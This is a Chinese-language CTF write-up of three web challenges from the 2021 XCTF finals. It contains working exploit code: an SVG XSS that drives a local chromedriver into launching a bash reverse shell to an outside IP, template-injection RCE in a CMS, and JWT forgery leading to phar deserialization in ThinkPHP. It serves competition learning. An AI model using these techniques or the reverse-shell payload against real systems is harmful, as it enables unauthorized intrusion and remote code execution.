---
title: 第六届XCTF决赛部分Writeup
date: 2021-5-30
tags:
    - CTF
    - Writeup
    - XCTF
---

## Prologue

这应该是我个人最近最后一场比赛了，整体而言挺开心的，还和诸葛老师合了影（  

## dngs2010

由于源码里摆明了让我们去选svg，那我们就去选svg。
在返回的页面中，我们能看到我们输入的内容被这样拼接进了html：

```html
<image x="10" y="10" width="100" height="100"
    href="http://q1.qlogo.cn/g?b=qq&nk={input}&s=640"></image>
```

继续浏览题目，发现选择二进制格式进行生成时除了像素低一点别的都一样，联想到题目中的selenium，不难猜到后段是用chrome渲染svg然后截图。多试几次就能发现，我们的输入位于 `/img/` 后的url中，程序取最后一个 `.` 前的内容作为输入，之后的内容作为生成方式。
自然而言，我们就是要打这个selenium了，不管怎么样先得xss，自然而言就得闭合标签。然而这里基本什么过滤都没有，非常舒适。

proof of concept:

```python
print(ses.get('http://172.35.6.36:3000/img/745679136" style="height:0">'+quote(f'''</image>
<script>console.log(1)</script>
<image>''', safe=' <>')+'.svg').text)
```

result:

```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="480px" height="120px" fill="#71e8f6" xmlns="http://www.w3.org/2000/svg">
略
<image x="10" y="10" width="100" height="100" href="http://q1.qlogo.cn/g?b=qq&nk=745679136" style="height:0"></image>
<script>console.log(1)</script>
<image>&amp;s=640"></image>
<text x="120" y="25">晚上好,来自美国(T-Mobile)的朋友</text>
略
</svg>
```

这里有两个小细节：

* xml规定一份文档只能有一个根结点，也就是说我们**不能**闭合svg标签。如果闭合了svg标签，html会报错导致截图不全，且svg闭合后的内容不会被渲染。
* 由于页面没有指定 `DOCTYPE HTML` ，我们的script标签中不能出现小于号大于号，不然会被识别成xml标签。

第一个问题注意即可，第二个问题我们可以通过 `eval(btoa(代码))` 的方式进行规避。
之后的流程参考https://paper.seebug.org/1559/，扫描端口，并向webdriver发起请求，创建新的进程，反弹shell即可。文中涉及到跨域访问仅允许localhost客户端访问webdriver的问题在本题中也不存在，因为发起请求的正是localhost。
这道题整体而言对于这样的比赛来说没有难度，但是坑比较多，比如端口量较大，往往扫不到webdriver控制端口，再比如每次请求都启动了新的chromedriver进程，导致端口不一样，所以扫描把人扫得非常沮丧。

{% spoiler 我所使用的js部分exploit %}

```javascript
window.state = "";
(async function() {
    document.getElementById('result').innerHTML = "start";
    window.state = "start";
    let n = 42;
    let i = 0;
    for(i = 45000; i < 65535; i++){
        if (i===3000)continue;
        try {
            let x = await fetch(`http://localhost:${i}/sessions`, { mode: "no-cors" });
            document.getElementById('result').innerHTML = "middle";
            window.state = "middle";
            window.state = "end";
            n = i;
            document.getElementById('result').innerHTML = n;
            break;
        } catch (err) {
            if(window.state == "end") break;
            document.getElementById('result').innerHTML = err;
            window.state = "err";
        }
    }
    document.getElementById('result').innerHTML += "...";
    try {
        let x = await fetch(`http://localhost:${n}/session`, {
            method: 'POST',
            mode: "no-cors",
            body: JSON.stringify({"capabilities":{"alwaysMatch":{"goog:chromeOptions":{
                "binary":"/usr/bin/python3", "args": ["-c__import__(\"os\").system(\"exec bash -i &>/dev/tcp/172.35.6.165/1234 <&1\")"]
            }}}}),
        });
        document.getElementById('result').innerHTML += await x.text();
    } catch (err) {
        document.getElementById('result').innerHTML += "error: " + err;
    }
})();
```

<svg width="480px" height="120px" fill="#a3185b" xmlns="http://www.w3.org/2000/svg">
<rect fill="#5ce7a4" width="100%" height="100%"></rect>
<image x="10" y="10" width="100" height="100" href="http://q1.qlogo.cn/g?b=qq&amp;nk=745679136" style="height:0"></image>
<text x="10" y="20" id="result">46233...</text>
<image>&amp;s=640"&gt;</image>
<text x="120" y="25">晚上好,来自美国(T-Mobile)的朋友</text>
<text x="120" y="45">今天是 2021年5月29日 星期六</text>
<text x="120" y="65">您的IP是 172.35.6.165</text>
<text x="120" y="85">您使用的是 Mac OS 10.15.7 操作系统</text>
<text x="120" y="105">您使用的是 Chrome(91.0.4472.77) 浏览器</text>
<text x="10" y="85">仅供展示效果用</text>
</svg>

{% endspoiler %}

## WarmupCMS

审计代码，上手搜eval的时候发现有一个很可疑的 `function.math.php`，经查阅文档，发现cms并没有自带这个函数，故猜测这个模版函数是出题人自行实现，暂定为sink点。经过刚才的一番查文档，我们也了解到这个cms有模版功能。

我们可以通过数据库文件中的用户md5值在线反查出密码，进入后台 `/admincp.php`。

> 题目中的文章需要进入后台刷新缓存后才能显示

```sql
INSERT INTO `icms_user` (`uid`, `gid`, `pid`, `username`, `nickname`, `password`, `gender`, `fans`, `follow`, `comments`, `article`, `favorite`, `credit`, `regip`, `regdate`, `lastloginip`, `lastlogintime`, `hits`, `hits_today`, `hits_yday`, `hits_week`, `hits_month`, `setting`, `type`, `status`) VALUES
(1, 65535, '0', 'admin', 'iCMS', '798709465daad71e1665888975791d7b', 0, 1, 1, 127, 7, 2, 0, '127.0.0.1', 1488883427, '127.0.0.1', 1523165779, 303, 0, 0, 0, 8, '{\"inbox\":{\"receive\":\"all\"}}', 0, 1);
```

{% asset_img backend.png %}

进入后台后不难发现cms作者的本意是不想让我们在网页上直接修改模版，对可以上传的文件后缀的设置也做了限制，作者还是进行了一些河里的思考的。

{% asset_img deny.png %}

可惜cms的上传目录可以相对于 `$webroot` 任意指定，而cms放置模版的目录正位于 `$webroot/template` 下。我们可以指定任意文件作为主页、文章等页面的模版（如 `htm` 文件），而 `htm` 处于上传后缀白名单中。也就是说我们可以将 `上传目录` 设置为 `template`，然后上传一份htm文件，在文件管理中获取到上传的文件名，并将其设置为主页模版，即可利用模版进行RCE。

{% asset_img specify_template.png %}

{% asset_img modify_settings.png %}

{% asset_img filename.png %}

回到math。虽然函数实现中对危险函数进行了限制，但我随手构造的 `<!--{math equation=(system("/readflag"))}-->` 恰巧突破了这一限制（带括号）（又貌似是缓存有助攻）。由于是比赛，时间紧迫，便没有深究。

{% asset_img warmup_flag.png %}

## easy_cms

由于题目并没有正确配置php服务器，我们需要通过手动指定controller来访问所有页面。

thinkphp，那我们先来看看有什么controller呗。

admin下的controller由于需要登录：

```php
if(!captcha_check($data['verify'])){
    throw new ValidateException('验证码错误');
}
if($this->checkLogin($data)){
    $this->success('登录成功', url('admin/Index/index'));
}
```

而服务端并没有安装图片相关拓展：

{% asset_img not_installed.png %}

所以登陆admin这条路基本是堵死了，也没必要继续看admin controller（当然不排除有些未认证的controller，只是这题确实没有）

在api 的 `Base` controller中我们发现有很明显的上传文件的方法，也有读取文件的方法，非常显然是让我们用phar反序列化来加载tp6的链。所以问题就在于如何登陆。我们回头看一眼路由，发现 `Base` controller被套了一个 `JwtAuth` 中间件。这一中间件取 `Authorization` 请求头的值作为jwt进行验证，认证通过则取token中的uid写入当前session。`JwtAuth` 调用了 `Jwt` 类，而生成 `Jwt` 的 api controller `Common` 中配置了jwt的参数：

```php
// route.php

Route::rule('Base/Upload', 'Base/Upload')->middleware(['JwtAuth']); //图片上传;

// Common controller

$jwt
    ->setIss(config('my.jwt_iss'))
    ->setAud(config('my.jwt_aud'))
    ->setSecrect(config('my.jwt_secrect'))
    ->setExpTime(config('my.jwt_expire_time'));

// config/my.php

//jwt鉴权配置
'jwt_expire_time'    => 7200,               //token过期时间 默认2小时
'jwt_secrect'        => 'boTCfOGKwqTNKArT', //签名秘钥
'jwt_iss'            => 'client.xhadmin',   //发送端
'jwt_aud'            => 'server.xhadmin',   //接收端
```

从配置文件中拿到jwt secret，仔细过一遍认证函数，把必要的属性都给加上，再把过期时间 (`exp`) 调的久一些，一个jwt就伪造好了

{% asset_img fake_token.png 四千年后过期的token %}

带着这个token，我们就能上传文件了：

```python
host = 'http://172.35.6.101:31337'
info = ses.post(host+'/?s=api/Base/upload', headers={
    'Authorization': 
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.'
        'eyJzdWIiOiIxMjM0NTY3ODkwIiwidWlkIjoxL'
        'CJpc3MiOiJjbGllbnQueGhhZG1pbiIsImF1ZC'
        'I6InNlcnZlci54aGFkbWluIiwiZXhwIjoxNTE'
        '2MjM5MDIyMDAsImlhdCI6MTUxNjIzOTAyMn0.'
        'vbtgheHpxnrT9W4VX1ybguJ15cwYO2pbVNCvrE7FqfU'
}, files={
    'file': ('a.gif', open('phar.gif', 'rb'))
}).json()
print(info)
# {'status': '200', 'data': '/uploads/api/202105/60b3b5da99bed.gif'}
```

同时，上传文件的 `upload` 方法下面就有 `checkFileExists` 方法，可以用于触发 phar 反序列化：

```python
req = ses.get(host, params={
    's': 'api/Base/checkFileExists',
    'filepath': 'phar:///var/www/html/public'+info['data']
    # 经过和出题人沟通，在比赛题目环境中必须使用绝对路径
})
print(req.text[-200:])
```

tp6的链略，https://lmgtfy.app
